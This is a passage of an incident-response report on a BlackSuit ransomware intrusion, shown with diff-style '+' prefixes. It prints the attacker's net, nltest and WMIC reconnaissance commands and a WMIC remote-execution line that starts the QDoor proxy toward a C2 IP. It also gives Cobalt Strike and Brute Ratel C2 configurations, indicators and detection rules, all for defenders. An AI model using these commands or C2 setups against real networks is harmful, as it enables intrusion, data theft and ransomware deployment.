+<p class="wp-block-paragraph">Shortly after getting access to one of the domain controllers in the environment, the threat actor executed the following commands in quick succession:</p>
+
+
+
+<pre class="wp-block-preformatted">net group "domain admins" /domain
+nltest /dclist:&lt;DOMAINNAME&gt;.local 
+</pre>
+
+
+
+<p class="wp-block-paragraph">Almost simultaneously, the threat actor moved to a backup server in the environment, performing the same remove service execution and deploying Cobalt Strike. Quickly after is the execution of the command for collection of the installed AV/EDR products via the WMIC.</p>
+
+
+
+<pre class="wp-block-preformatted">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 
+</pre>
+
+
+
+<p class="wp-block-paragraph">While WMIC is deprecated since W10 21H1, it is still regularly used for multiple administrative tasks or by threat actors. </p>
+
+
+
+<p class="wp-block-paragraph">Moving onto multiple machines in the environment, dropping Cobalt Strike Beacons, the actor performed the following Discovery commands:</p>
+
+
+
+<pre class="wp-block-preformatted">net user &lt;PRIV_USER&gt; /domain 
+
+ping &lt;workstation1&gt; 
+ping &lt;workstation2&gt; 
+net view //&lt;IP1&gt;/ 
+net view \\&lt;IP1&gt;\        Note:now with correct '\' 
+
+nltest /domain_trusts /all_trusts 
+
+net view \\&lt;IP2&gt;\ 
+net view \\&lt;IP3&gt;\ 
+net view \\&lt;IP4&gt;\ 
+net view \\&lt;IP5&gt;\ 
+net view \\&lt;IP6&gt;\ 
+
+nltest /dclist:&lt;DOMAIN&gt; 
+ping &lt;DOMAIN&gt; 
+nltest /FINDUSER:REDACTED
+</pre>
+
+
+
+<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42865" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_036.png" alt="" width="825" height="666" /></a></p>
+
+
+
+
+
+<p class="wp-block-heading"><strong>Remote Service</strong></p>
+
+
+
+<p class="wp-block-paragraph">The main method used by the threat actor to move laterally was by using the jump psexec_psh feature of Cobalt Strike. By using this technique, they installed Cobalt Strike on multiple hosts in rapid succession via PowerShell and base64 encoded payload.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42866" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_037.png" alt="" width="699" height="90" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">By using Zeek, we can observe all the calls done over RPC to create and execute this service.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42867" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_038.png" alt="" width="599" height="228" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph"><a href="https://x.com/Cyb3rSn0rlax" target="_blank" rel="noreferrer noopener">Cyb3rSn0rlax</a> have created a <a href="https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-1#cobaltstrike-jump-psexec_psh" target="_blank" rel="noreferrer noopener">really good resource on how to detect these kinds of techniques</a></p>
+
+
+
+<p class="wp-block-paragraph">Leveraging Cyberchef, the recipe <a href="https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/#lateral-movement" target="_blank" rel="noreferrer noopener">described in our earlier report</a>, we can decode the shellcode.</p>
+
+
+
+
+
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42868" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_039.png" alt="" width="542" height="454" /></a></p>
+<p class="wp-block-heading"><strong>RDP</strong></p>
+
+
+
+<p class="wp-block-paragraph">Using the proxy capability inside QDoor, they used RDP to access a file server and domain controller. This could be observed in the event ID 4624 LogonType 10 logs:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42869" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_040.png" alt="" width="658" height="822" /></a></p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;</p>
+
+
+
+<p class="wp-block-paragraph">Since QDoor&#8217;s C2 communication is unencrypted it&#8217;s possible to spot this behavior with Suricata.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42870" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_041.png" alt="" width="881" height="81" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">While performing these RDP actions the threat actor leaked their back end hostname via various log events:</p>
+
+
+
+<pre class="wp-block-preformatted">Workstation Name:DESKTOP-NT7KVK5
+</pre>
+
+
+
+<p class="wp-block-paragraph" style="text-align: center;">event ID 4779:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42871" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_042.png" alt="" width="882" height="354" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph" style="text-align: center;">event ID 4624 LogonType 3:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42872" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_043.png" alt="" width="649" height="814" /></a></p>
+
+
+
+
+
+<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
+
+
+
+<p class="wp-block-paragraph">On the file server via a RDP session, they used the Edge browser to download WinRAR and used it to begin compressing file share data into an archive. Here we used Dissect&#8217;s <a href="https://docs.dissect.tools/en/stable/plugins/edge.downloads.html" target="_blank" rel="noreferrer noopener">Edge browser plugin</a> to extract data collected through KAPE.</p>
+
+
+
+<pre class="wp-block-preformatted">$ target-query &lt;REDACTED&gt; -f edge.downloads | rdump -f '{browser} downloaded {path} from {url} {size} via {tab_referrer_url}'
+edge downloaded C:\Users\&lt;REDACTED&gt;\Downloads\winrar-x64-701.exe from https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-701.exe 3.77 MB via https://www.bing.com/
+edge downloaded C:\Users\&lt;REDACTED&gt;\Downloads\winrar-x64-701 (1).exe from https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe 3.77 MB via https://www.bing.com/
+</pre>
+
+
+
+<p class="wp-block-paragraph">They then executed WinRAR with the following command to compress a file share folder.</p>
+
+
+
+<pre class="wp-block-preformatted">"C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext   -imon1 -- . G:\REDACTED
+</pre>
+
+
+
+<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
+
+
+
+<p class="wp-block-paragraph">In this case, four separate command and control channels were used, SectopRAT, Brute Ratel, QDoor and Cobalt Strike. All these frameworks were used by the threat actor to move in and out of the victim&#8217;s environment. </p>
+
+
+
+<p class="wp-block-heading"><strong>SectopRAT:</strong></p>
+
+
+
+<p class="wp-block-paragraph">The following rules triggered on the traffic, after SectopRAT injected itself into the MSBuild.exe process for 45.141.87[.]218.</p>
+
+
+
+<pre class="wp-block-preformatted">ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init 
+</pre>
+
+
+
+<p class="wp-block-paragraph">This rule fired when traffic to the destination port 15647 was observed:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42873" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_044.png" alt="" width="1833" height="794" /></a></p>
+
+
+
+
+
+<pre class="wp-block-preformatted">MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET)  
+</pre>
+
+
+
+<p class="wp-block-paragraph">This rule fired during C2 beaconing activity to destination port 9000 that looked like:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42874" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_045.png" alt="" width="533" height="227" /></a></p>
+
+
+
+
+
+<p class="wp-block-heading"><strong>Brute Ratel Badger:</strong></p>
+
+
+
+<p class="wp-block-paragraph">5.181.159[.]31 with the associated domain megupdate.com</p>
+
+
+
+<p class="wp-block-paragraph">When looking for this activity, the following rules were associated to this IP:</p>
+
+
+
+<p class="wp-block-paragraph">ET INFO Observed ZeroSSL SSL/TLS Certificate</p>
+
+
+
+<p class="wp-block-paragraph">For this Badger (2905.dll), the following config was extracted:</p>
+
+
+
+<figure class="wp-block-table">
+<table class="has-fixed-layout">
+<tbody>
+<tr>
+<td><strong>User Agent</strong></td>
+<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</td>
+</tr>
+<tr>
+<td><strong>C2</strong></td>
+<td>megupdate[.]com</td>
+</tr>
+<tr>
+<td><strong>Port</strong></td>
+<td>443</td>
+</tr>
+<tr>
+<td><strong>URI</strong></td>
+<td>&#8216;/procupdater.php&#8217;, &#8216;/callsysprocess.php&#8217;</td>
+</tr>
+<tr>
+<td><strong>Keys</strong></td>
+<td>&#8216;FDI3KJPV29S8P4IO&#8217;, &#8216;EQRAA57CS67L38JH&#8217;</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+<p class="wp-block-paragraph">Another sample (3004.dll) was found in the environment, containing a different configured C2:</p>
+
+
+
+<figure class="wp-block-table">
+<table class="has-fixed-layout">
+<tbody>
+<tr>
+<td><strong>User Agent</strong></td>
+<td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</td>
+</tr>
+<tr>
+<td><strong>C2</strong></td>
+<td>administrative-manufacturer-gw.aws-usw2.cloud-ara.tyk[.]io</td>
+</tr>
+<tr>
+<td><strong>Port</strong></td>
+<td>443</td>
+</tr>
+<tr>
+<td><strong>URI</strong></td>
+<td>&#8216;/api/azure&#8217;</td>
+</tr>
+<tr>
+<td><strong>Keys</strong></td>
+<td>&#8216;8AVPN2FQAF8AA5BO&#8217;, &#8216;MNP7SLSPMTF2TR9G&#8217;</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+<p class="wp-block-heading"><strong>Cobalt Strike Beacon:</strong></p>
+
+
+
+<p class="wp-block-paragraph">The beacon had the following configuration (trimmed):</p>
+
+
+
+<pre class="wp-block-preformatted">{
+    "CobaltStrikeBeacon": {
+        "BeaconType": "HTTPS"
+        "Port": 443
+        "C2Server": [ "provincial-gaiters-gw.aws-use1.cloud-ara[.]tyk.io,/api/v2/login"],
+        "HttpPostUri": ["/api/v2/status"],
+        "Malleable_C2_Instructions": [
+            [ "Remove 1522 bytes from the end",
+                "Remove 84 bytes from the beginning",
+                "Remove 3931 bytes from the beginning",
+                "Base64 URL-safe decode",
+                "XOR mask w/ random key"]
+        "Spawnto_x86": ["%windir%\\syswow64\\dllhost.exe"],
+        "Spawnto_x64": ["%windir%\\sysnative\\dllhost.exe"],
+        "Watermark": [987654321]
+        "bProcInject_MinAllocSize": [17500],
+        "ProcInject_PrependAppend_x86": [["9090",""]],
+        "ProcInject_Execute": [
+            ["ntdll:RtlUserThreadStart",
+                "CreateThread",
+                "NtQueueApcThread-s",
+                "CreateRemoteThread",
+                "RtlCreateUserThread"]
+}
+</pre>
+
+
+
+<p class="wp-block-paragraph">This is interesting as this matches the second Badger which was configured to use a <em>tyk[.]io</em> domain, but showed no traces of execution. <a href="https://github.com/TykTechnologies/tyk" target="_blank" rel="noreferrer noopener">Tyk </a>is an open source universal API management tool for REST, GraphQL, gRPC and async APIs, enabling quick API setup and access. This kind of activity is becoming more common, as this enables threat actors leveraging legitimate infrastructure for their malicious campaigns. An example, showing the usage of Cobalt Strike, is this blog from 2022 written by Askar on <a href="https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/" target="_blank" rel="noreferrer noopener">shells.systems</a>, showing the exact same uri&#8217;s as in this campaign.</p>
+
+
+
+<p class="wp-block-paragraph">It is unclear why the threat actor decided to continue with Cobalt Strike instead of Brute Ratel during lateral movement, especially if the unexecuted Badger contained a similar Tyk C2 domain.</p>
+
+
+
+<p class="wp-block-heading"><strong>QDoor</strong></p>
+
+
+
+<p class="wp-block-paragraph">During this intrusion we observed a proxy used by the threat actor. This proxy turned out to be a tool called QDoor that has been seen in multiple other case involving BlackSuit ransomware. It has been written about by ConnectWise in which its functionality is explained in more detail:</p>
+
+
+
+<figure class="wp-block-embed">
+<div class="wp-block-embed__wrapper"><a href="https://www.linkedin.com/pulse/qdoor-new-backdoor-tool-blacksuits-arsenal-connectwise-uwvhc">https://www.linkedin.com/pulse/qdoor-new-backdoor-tool-blacksuits-arsenal-connectwise-uwvhc</a></div>
+<div> </div>
+<div class="wp-block-embed__wrapper">The file has a hard-coded C2 in the binary of 88.119.167[.]239. This can be observed in the strings of the file.</div>
+</figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42875" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_046.png" alt="" width="431" height="641" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">QDoor can also be run with command-line arguments, by passing an address for C2 configuration, which was the case in this intrusion:</p>
+
+
+
+<pre class="wp-block-preformatted">%WINDIR%\system32\cmd.exe /C wmic /node:"REDACTED" process call create "%WINDIR%\Temp\svhost.exe "143.244.146[.]183"" 
+</pre>
+
+
+
+<p class="wp-block-paragraph">This activity triggered the following ET rule, indicating an tunneled RDP sessions over the established proxy facilitated by QDoor:</p>
+
+
+
+<pre class="wp-block-preformatted">ET POLICY Tunneled RDP msts Handshake 
+</pre>
+
+
+
+<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
+
+
+
+<p class="wp-block-paragraph">After creating a RAR archive as noted in the <a href="#collection">Collection</a> section, the threat actor moved to exfiltrate this data. Using Edge, they went to mystuff.bublup.com. <a href="https://www.bublup.com/">Bublup</a> is a SASS project management suite that includes cloud based storage.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42876" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_047.png" alt="" width="1399" height="441" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Bublup uses amazon S3 as their back-end for storage.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42877" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_048.png" alt="" width="2225" height="188" /></a></p>
+
+
+
+<p class="wp-block-paragraph">The threat actor then proceeded to upload the rar archives to the cloud storage service.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42878" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_049.png" alt="" width="1089" height="241" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">In total, 934.38 MB was transferred to the cloud storage service</p>
+
+
+
+<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
+
+
+
+<p class="wp-block-paragraph">Near the end of day nine, the threat actor prepared for ransomware deployment by downloading a set of files necessary for its propagation. The file archive utility WinRar 7.0.1 was downloaded using Microsoft Edge and installed on one of the domain controllers.</p>
+
+
+
+<p class="wp-block-paragraph">The Edge history file C:\Users\&lt;redacted&gt;\AppData\Local\Microsoft\Edge\User Data\Default\History contained the following entry:</p>
+
+
+
+<pre class="wp-block-preformatted">https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-701.exe (C:\Users\REDACTED\Downloads\winrar-x64-701.exe). State: Complete. Received 3948120 of 3948120 bytes. Interrupt Reason: No Interrupt - Success. Danger Type: Content May Be Malicious - (eg: extension is exe but Safe Browsing has not finished checking the content).
+</pre>
+
+
+
+<p class="wp-block-paragraph">WinRAR was used to uncompress an archive fetched from the temporary storage website <a href="http://temp.sh" target="_blank" rel="noreferrer noopener">temp.sh</a>.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42879" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_050.png" alt="" width="1425" height="217" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The contents of the RAR archive were extracted into the local user’s Downloads directory.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42880" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_051.png" alt="" width="1204" height="266" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The RAR archive contained the following files:</p>
+
+
+
+<ul class="wp-block-list">
+<li>123.exe</li>
+
+
+
+<li>PsExec.exe</li>
+
+
+
+<li>comps[1-4].txt  </li>
+
+
+
+<li>COPY.bat</li>
+
+
+
+<li>EXE.bat</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">The threat actor created a network share to stage the files and facilitate the deployment process:</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42881" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_052.png" alt="" width="1600" height="369" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The batch script COPY.BAT was then executed and distributed the BlackSuit ransomware payload named 123.exe to multiple remote hosts using PsExec. The files comps[1-4].txt &#8211; represented target lists containing private IP addresses of hosts on the victim&#8217;s network.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42882" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_053.png" alt="" width="1199" height="290" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The second batch script EXE.bat contained within the RAR archive, was executed to initiate the encryption process on the designated remote hosts using PsExec.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_054.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42883" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_054.png" alt="" width="1207" height="305" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The ransomware targeted data recovery mechanisms by attempting to delete all Volume Shadow Copies (VSS).</p>
+<p><img loading="lazy" decoding="async" class="size-full wp-image-42965 aligncenter" src="https://thedfirreport.com/wp-content/uploads/2025/03/321.png" alt="" width="483" height="280" /></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Finally, the threat actor used WMIC on their staging domain controller, to execute the ransomware a final time.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42885" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_056.png" alt="" width="1144" height="479" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The following ransom note was displayed on all affected systems post-encryption.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42886" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_057.png" alt="" width="941" height="208" /></a></p>
+
+
+
+
+
+<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_058.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42887" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_058.png" alt="" width="3728" height="1376" /></a></p>
+
+
+
+
+
+<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2025/03/29354_059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-42888" src="https://thedfirreport.com/wp-content/uploads/2025/03/29354_059.png" alt="" width="2782" height="2840" /></a></p>
+
+
+
+
+
+<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
+
+
+
+<h3 class="wp-block-heading">Atomic</h3>
+
+
+
+<pre class="wp-block-preformatted">d3f@ckloader
+http://78.47.105[.]28/manual/152/152.zip
+http://78.47.105[.]28/manual/152/1522.zip
+
+SecTopRAT
+45.141.87[.]218:9000
+
+Brute Ratel:
+megupdate[.]com:443 / 5.181.159[.]31:443
+administrative-manufacturer-gw.aws-usw2.cloud-ara.tyk[.]io:443
+
+Cobalt Strike
+provincial-gaiters-gw.aws-use1.cloud-ara.tyk.io:443 / 44.196.9.9:443
+
+QDoor
+88.119.167[.]239:443
+143.244.146[.]183:443
+</pre>
+
+
+
+<h3 class="wp-block-heading">Computed</h3>
+
+
+
+<pre class="wp-block-preformatted">EXE.bat
+80110fbb81d0407340b908bb43c815d3
+8d4f2aa315ce17505b8698db22ec2526805645a4
+b837bec967df6748b72c3b43c254532620977d0bbe0fc23e0c178c74516baab9
+
+COPY.bat
+d98fb34b4fa0f83d02e3272f1cb9c5fc
+6c75e2c704f69aaa09cdfd455c7bdbf9336dc7fe
+f34aad9a56ca9310f40ecbcb075e4be12aaf9ef60fd24893b5e8fb28934cd730
+
+123.exe
+91f69fa3439f843b51c878688963e574
+c5826e9e3c4b1fece4991f269fd4e5307e92bfe2
+ecb0b3057163cd25c989a66683cfb47c19f122407cbbb49b1043e908c4f07ad1
+
+PsExec.exe
+27304b246c7d5b4e149124d5f93c5b01
+e50d9e3bd91908e13a26b3e23edeaf577fb3a095
+3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef
+
+svhost.exe
+85144918f213e38993383f0745d7e41e
+a6dcdfc8e97616c07549290950e78b145883e532
+e6cfae572f777def856878e36bbacfaa82cb5662fc97c1492e2367a105dddbc9
+
+artillery.mdb
+ffb3755897b8d38ccc70b9c3baa38960
+a25cfdcff675277035fb35add9d273934117e943
+b594b8b91b6967e2fa6946753c8fd3f6ed3592c55c49a0ada7abd41752ae8a41
+
+UIxMarketPlugin.dll
+d1ba9412e78bfc98074c5d724a1a87d6
+0572f98d78fb0b366b5a086c2a74cc68b771d368
+cbcea8f28d8916219d1e8b0a8ca2db17e338eb812431bc4ad0cb36c06fd67f15
+
+relay.dll
+9bddb0e95a03fdcea4c62210f5818184
+3eb042e449c6097f29fad255d21aac336fae534b
+cb53118ec2d578febfd311bcda298c716f1f543b24f780f2721f45df0bda3dc3
+
+article.dat
+4b22032954a12677675add0de20d7b94
+5b1e0d72435da7d3a97107cddc655be71769ba53
+a8a88bf91d1280ffa59536a6e50f24fe9c1ef79f68a300ef047d92eec7231d9e
+
+152.exe
+9fb4770ced09aae3b437c1c6eb6d7334
+fe54b31b0db8665aa5b22bed147e8295afc88a03
+a05b592a971fe5011554013bcfe9a4aaf9cfc633bdd1fe3a8197f213d557b8d3
+
+2905.dll
+8477ef317b8974e18ed84ca69b9f6a08
+328d5554025757e5ec8e2e9eee2ad97d0e986a59
+b676dbc3e20fa7acb92c1cc0a90132798c482dbf43211793abb937bd43295d42
+
+run32.exe
+eae6cd02784743cde314afb8c533c5cd
+a13061b229a225441f67d2b25ccda139ee21b14e
+58dde623e36fefe8038aa2d579d3d1f5394b96ea3623b3125876137b4ee08d80
+
+Zoom_v_2.00.4.exe
+c0230d748e61819d9dfad0da03fe6ec8
+951154980d3ddd4101b8e09b11669cbedc86f979
+3967b38f763b2e58b0679bc0178247b855c68d761187c71c2f1760b6882e473a
+
+3004.dll
+f91fbe09b593fb1104b30e3343afb392
+41360d3eae3a71dd60c9ac34788d6863ef4e3e30
+63dcff4bad9576794c3a412cf8dae83b807a138cc09c4de64485bb8ec991cd4b
+
+1522.exe
+5b8ebe43ded7ba460e4827206329375a
+df774b96aa6f7ba914e7d6c1e3c448170e2e419e
+e0f31fe28223b5bd22ce01c6bc1d3a4d3e030b9dc3c98440d11d72e67fdaa453
+</pre>
+
+
+
+
+
+<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
+
+
+
+<h3 class="wp-block-heading">Network</h3>
+
+
+
+<pre class="wp-block-preformatted">ETPRO ADWARE_PUP InnoDownloadPlugin User-Agent Observed
+ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init 
+ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET)
+ET INFO Observed ZeroSSL SSL/TLS Certificate
+ET POLICY Tunneled RDP msts Handshake
+ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
+ET POLICY PsExec service created
+</pre>
+
+
+
+<h3 class="wp-block-heading">Sigma</h3>
+
+
+
+<p class="wp-block-paragraph">DFIR Private Rules:</p>
+
+
+
+<pre class="wp-block-preformatted">e6be809d-adfd-473b-b1f5-4a3cc5938df1 - Suspicious RAR Archive Download From temp.sh  
+b8a5dde0-fb1c-466e-832e-5a9b33e59b69 - Suspicious Temp File Lookup for Steam User Profile  
+78e4aeff-80ce-4b86-9664-2f0313e960e3 - Potential DLL Side Loading Abuse of IKARUS Security GuardX  
+476d0227-967d-4429-bc02-abe0985275e2 - Potential SectopRAT MSBuild Network communication  
+c475246c-133b-454e-9b9f-963139b4af1a - Adding Hidden Attribute Flag via Command line to Directory  
+c79b4806-b86f-4c6e-a7b8-ecdb4b73fb70 - Detect AV/EDR Solutions Enumeration via WMIC  
+6df37102-c993-4133-ad3d-b12ca32e03c6 - Detect Process Creation via WMIC with Remote Node
+</pre>
+
+
+
+<p class="wp-block-paragraph">Sigma Repo:</p>
+
+
+
+<pre class="wp-block-preformatted">2aa0a6b4-a865-495b-ab51-c28249537b75 - Startup Folder File Write
+36e037c4-c228-4866-b6a3-48eb292b9955 - DNS Query Request By Regsvr32.EXE
+526be59f-a573-4eea-b5f7-f0973207634d - New Process Created Via Wmic.EXE
+5cc90652-4cbd-4241-aa3b-4b462fa5a248 - Potential Recon Activity Via Nltest.EXE
+e568650b-5dcd-4658-8f34-ded0b1e13992 - Potential Product Class Reconnaissance Via Wmic.EXE
+d95de845-b83c-4a9a-8a6a-4fc802ebf6c0 - Suspicious Group And Account Reconnaissance Activity Using Net.EXE
+0ef56343-059e-4cb6-adc1-4c3c967c5e46 - Suspicious Execution of Systeminfo
+62510e69-616b-4078-b371-847da438cc03 - Share And Session Enumeration Using Net.EXE
+d7a95147-145f-4678-b85d-d1ff4a3bb3f6 - CobaltStrike Service Installations - Security
+bd8b828d-0dca-48e1-8a63-8a58ecf2644f - Group Membership Reconnaissance Via Whoami.EXE
+fa91cc36-24c9-41ce-b3c8-3bbc3f2f67ba - PsExec Tool Execution
+c947b146-0abc-4c87-9c64-b17e9d7274a2 - Shadow Copies Deletion Using Operating Systems Utilities
+15619216-e993-4721-b590-4c520615a67d - Potential Meterpreter/CobaltStrike Activity
+</pre>
+
+
+
+<h3 class="wp-block-heading">Yara</h3>
+
+
+
+<p class="wp-block-paragraph">External rules:</p>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://www.linkedin.com/pulse/qdoor-new-backdoor-tool-blacksuits-arsenal-connectwise-uwvhc/" target="_blank" rel="noreferrer noopener">https://www.linkedin.com/pulse/qdoor-new-backdoor-tool-blacksuits-arsenal-connectwise-uwvhc/</a></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">From <a href="https://yarahq.github.io/" target="_blank" rel="noreferrer noopener">Yaraforge</a> :</p>
+
+
+
+<pre class="wp-block-preformatted">AVASTTI_Cobaltstrike_Payload_Encoded
+AVASTTI_Cobaltstrike_Raw_Payload_Smb_Stager_X86
+CAPE_Bruteratel
+CAPE_Bruteratelconfig
+CAPE_Bruteratelsyscall
+CAPE_Cobaltstrikestager
+CobaltStrike_Resources_Command_Ps1_v2_5_to_v3_7_and_Resources_Compress_Ps1_v3_8_to_v4_x
+CobaltStrike_Resources_Smbstager_Bin_v2_5_through_v4_x
+CobaltStrike_Resources_Template_x64_Ps1_v3_0_to_v4_x_excluding_3_12_3_13
+CobaltStrike_Sleep_Decoder_Indicator
+Cobaltbaltstrike_Payload_Encoded
+Cobaltbaltstrike_RAW_Payload_smb_stager_x86
+DITEKSHEN_MALWARE_Win_Arechclient2
+ELASTIC_Windows_Generic_Threat_2Ae9B09E
+ELASTIC_Windows_Hacktool_Rubeus_43F18623
+ELASTIC_Windows_Shellcode_Generic_8C487E57
+ELASTIC_Windows_Trojan_Bruteratel_5B12Cbab
+ELASTIC_Windows_Trojan_Cobaltstrike_663Fc95D
+ELASTIC_Windows_Trojan_Cobaltstrike_8D5963A2
+ELASTIC_Windows_Trojan_Cobaltstrike_B54B94Ac
+ELASTIC_Windows_Trojan_Metasploit_38B8Ceec
+ELASTIC_Windows_Trojan_Redlinestealer_15Ee6903
+EMBEERESEARCH_Win_Cobalt_Sleep_Encrypt
+GCTI_Cobaltstrike_Resources_Command_Ps1_V2_5_To_V3_7_And_Resources_Compress_Ps1_V3_8_To_V4_X
+GCTI_Cobaltstrike_Resources_Smbstager_Bin_V2_5_Through_V4_X
+GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13
+HKTL_CobaltStrike_Beacon_4_2_Decrypt
+HKTL_CobaltStrike_SleepMask_Jul22
+Msfpayloads_msf_ref
